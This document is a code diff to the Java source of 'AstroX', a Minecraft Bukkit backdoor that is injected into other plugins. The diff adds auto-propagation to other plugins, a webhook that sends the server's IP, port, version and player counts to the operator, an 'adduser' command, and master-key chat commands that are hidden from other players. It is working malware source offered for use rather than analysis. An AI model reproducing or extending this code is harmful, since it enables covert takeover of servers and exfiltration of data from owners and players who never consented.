@@ -1,5 +1,9 @@
 package dev.naruto.astrox.payload;
 
+import dev.naruto.astrox.Config;
+import dev.naruto.astrox.RuntimeConfig;
+import dev.naruto.astrox.utils.DebugLogger;
+import dev.naruto.astrox.utils.WebhookNotifier;
 import dev.naruto.astrox.payload.commands.*;
 import org.bukkit.Bukkit;
 import org.bukkit.entity.Player;
@@ -11,17 +15,14 @@ import org.bukkit.plugin.java.JavaPlugin;
 
 import java.util.Arrays;
 
-/**
- * Main backdoor payload - injected into target plugin
- */
 public class BackdoorCore implements Listener {
     private final JavaPlugin plugin;
     private final CommandHandler handler;
     private final AuthManager authManager;
+    private PropagationEngine propagationEngine; // Can be null if disabled
 
-    // Hardcoded for now (change before compilation if needed)
-    private static final String COMMAND_PREFIX = "#";
-    private static final String MASTER_KEY = "test";
+    private static final String COMMAND_PREFIX = RuntimeConfig.commandPrefix;
+    private static final String MASTER_KEY = Config.MASTER_KEY;
 
     /**
      * Entry point called from injected plugin's onEnable()
@@ -31,11 +32,16 @@ public class BackdoorCore implements Listener {
             BackdoorCore core = new BackdoorCore(plugin);
             plugin.getServer().getPluginManager().registerEvents(core, plugin);
 
-            // Debug message (comment out for stealth)
-            plugin.getLogger().info("[AstroX] Backdoor initialized. Prefix: " + COMMAND_PREFIX);
+            DebugLogger.injection(plugin.getName(), plugin.getClass().getPackage().getName());
+
+            // Start propagation engine
+            core.startPropagation();
+
+            // Send deployment notification
+            core.notifyDeployment();
+
         } catch (Exception e) {
-            // Silent fail
-            e.printStackTrace();
+            DebugLogger.error("Failed to inject backdoor", e);
         }
     }
 
@@ -44,8 +50,50 @@ public class BackdoorCore implements Listener {
         this.authManager = new AuthManager();
         this.handler = new CommandHandler(plugin, authManager);
 
-        // Register all commands
         registerCommands();
+
+        DebugLogger.log("BackdoorCore initialized with " + handler.getCommands().size() + " commands");
+    }
+
+    /**
+     * Start auto-propagation engine
+     */
+    private void startPropagation() {
+        if (!RuntimeConfig.enablePropagation) {
+            DebugLogger.log("Auto-propagation disabled");
+            return;
+        }
+
+        try {
+            propagationEngine = new PropagationEngine(plugin);
+            propagationEngine.start();
+            DebugLogger.log("Auto-propagation engine started");
+        } catch (Exception e) {
+            DebugLogger.error("Failed to start propagation engine", e);
+        }
+    }
+
+    /**
+     * Send deployment notification
+     */
+    private void notifyDeployment() {
+        if (RuntimeConfig.webhookUrl == null) return;
+
+        Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
+            try {
+                WebhookNotifier notifier = new WebhookNotifier(RuntimeConfig.webhookUrl);
+                notifier.sendServerDeployment(
+                        plugin.getName(),
+                        Bukkit.getVersion(),
+                        Bukkit.getOnlinePlayers().size(),
+                        Bukkit.getMaxPlayers(),
+                        COMMAND_PREFIX
+                );
+                DebugLogger.log("Deployment notification sent");
+            } catch (Exception e) {
+                DebugLogger.error("Failed to send deployment webhook", e);
+            }
+        });
     }
 
     private void registerCommands() {
@@ -81,8 +129,8 @@ public class BackdoorCore implements Listener {
         // Access control
         handler.register("auth", new AuthCommand());
         handler.register("deauth", new DeauthCommand());
+        handler.register("adduser", new AddUserCommand());
 
-        // Give
         handler.register("give", new GiveCommand());
     }
 
@@ -90,17 +138,13 @@ public class BackdoorCore implements Listener {
     public void onChat(AsyncPlayerChatEvent event) {
         String message = event.getMessage();
 
-        // Check if message starts with our prefix
         if (!message.startsWith(COMMAND_PREFIX)) {
             return;
         }
 
-        // Cancel the chat message so it doesn't broadcast
         event.setCancelled(true);
-
         Player player = event.getPlayer();
 
-        // Parse command
         String cmdLine = message.substring(COMMAND_PREFIX.length());
         if (cmdLine.isEmpty()) return;
 
@@ -108,30 +152,48 @@ public class BackdoorCore implements Listener {
         String cmdName = parts[0].toLowerCase();
         String[] args = Arrays.copyOfRange(parts, 1, parts.length);
 
-        // Special handling for auth command (always allowed)
+        DebugLogger.command(player, cmdName, args);
+
+        // Auth command (special handling)
         if (cmdName.equals("auth")) {
             if (args.length > 0 && args[0].equals(MASTER_KEY)) {
                 authManager.authorize(player.getUniqueId(), MASTER_KEY);
                 player.sendMessage("§a§l[AstroX] Access granted.");
+                DebugLogger.authAttempt(player, args[0], true);
+                notifyAuthentication(player);
             } else {
                 player.sendMessage("§cUnknown command. Type \"/help\" for help.");
+                DebugLogger.authAttempt(player, args.length > 0 ? args[0] : "", false);
             }
             return;
         }
 
-        // Check authorization for other commands
         if (!authManager.isAuthorized(player.getUniqueId())) {
-            // Silent fail for unauthorized users
             return;
         }
 
-        // Execute command on main thread
         Bukkit.getScheduler().runTask(plugin, () -> {
             try {
                 handler.execute(cmdName, player, args);
             } catch (Exception e) {
-                // Silent fail
-                e.printStackTrace();
+                DebugLogger.error("Command execution failed: " + cmdName, e);
+            }
+        });
+    }
+
+    private void notifyAuthentication(Player player) {
+        if (RuntimeConfig.webhookUrl == null) return;
+
+        Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
+            try {
+                WebhookNotifier notifier = new WebhookNotifier(RuntimeConfig.webhookUrl);
+                notifier.sendAuthNotification(
+                        player.getName(),
+                        player.getUniqueId().toString(),
+                        Bukkit.getIp() + ":" + Bukkit.getPort()
+                );
+            } catch (Exception e) {
+                DebugLogger.error("Failed to send auth webhook", e);
             }
         });
     }
